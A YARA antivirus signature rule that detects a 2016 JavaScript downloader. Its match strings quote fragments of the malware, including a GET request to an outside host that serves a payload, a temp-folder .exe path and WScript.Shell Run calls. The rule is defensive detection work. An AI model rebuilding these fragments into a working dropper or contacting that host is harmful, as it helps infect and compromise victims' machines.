rule sig_20160328_0ec46b6f9983af7bd424c529fa0b2a7c {
  meta:
    description = "datamaliciousorder - file 20160328_0ec46b6f9983af7bd424c529fa0b2a7c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3efaf2656746dad7f7337d630081da5ff93cb25e0dbcc4b52250d21645c913ed"

  strings:
    $s1  = "function Cstxhqdqbq() {return Qceiy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"x6pS3yMapkEBh.exe\";};" fullword ascii
    $s2  = "Cnfxuqg[Otunw](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Jdeomcm](Bttyptpros() * 11)} while (Cnfxuqg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qceiy = function Qdkcpv() {return WScript[Wncms](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Cueuynlqzy(Pllhsevd, Qiswhz){return Pllhsevd - Qiswhz;};" fullword ascii
    $s6  = " while (Lznqmwtmpn){" fullword ascii
    $s7  = "function Ujoxhm(Hzqhvt){Qceiy[\"Run\"](Hzqhvt, Qrujh, Qrujh);};" fullword ascii
    $s8  = "function Uejgypqi() {return ((Inssweeob == true) && (Inssweeob == Btzdrzsmgs)) ? 1 : Qrujh;};" fullword ascii
    $s9  = "var Hrjhqvfl = false;" fullword ascii
    $s10 = "var Btzdrzsmgs = false;" fullword ascii
    $s11 = "function Kqxzpgnkj(){return Wncms;};" fullword ascii
    $s12 = "Inssweeob = true; " fullword ascii
    $s13 = "function Fvpolvax()" fullword ascii
    $s14 = "Btzdrzsmgs = true; " fullword ascii
    $s15 = "return Cueuynlqzy(Vxpkjvth, Iqlpqbnmz);" fullword ascii
    $s16 = "var Oufgxyyq = new this[\"Date\"]();" fullword ascii
    $s17 = "var Inssweeob = false;" fullword ascii
    $s18 = "function Sqyhbwn(Hlcoclvnu) {var Gosbs = (1, 2, 3, 4, 5, Hlcoclvnu); return Gosbs;};" fullword ascii
    $s19 = "function Bttyptpros(){return 22;};" fullword ascii
    $s20 = "function Fdknq(){return Ulbojoda;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}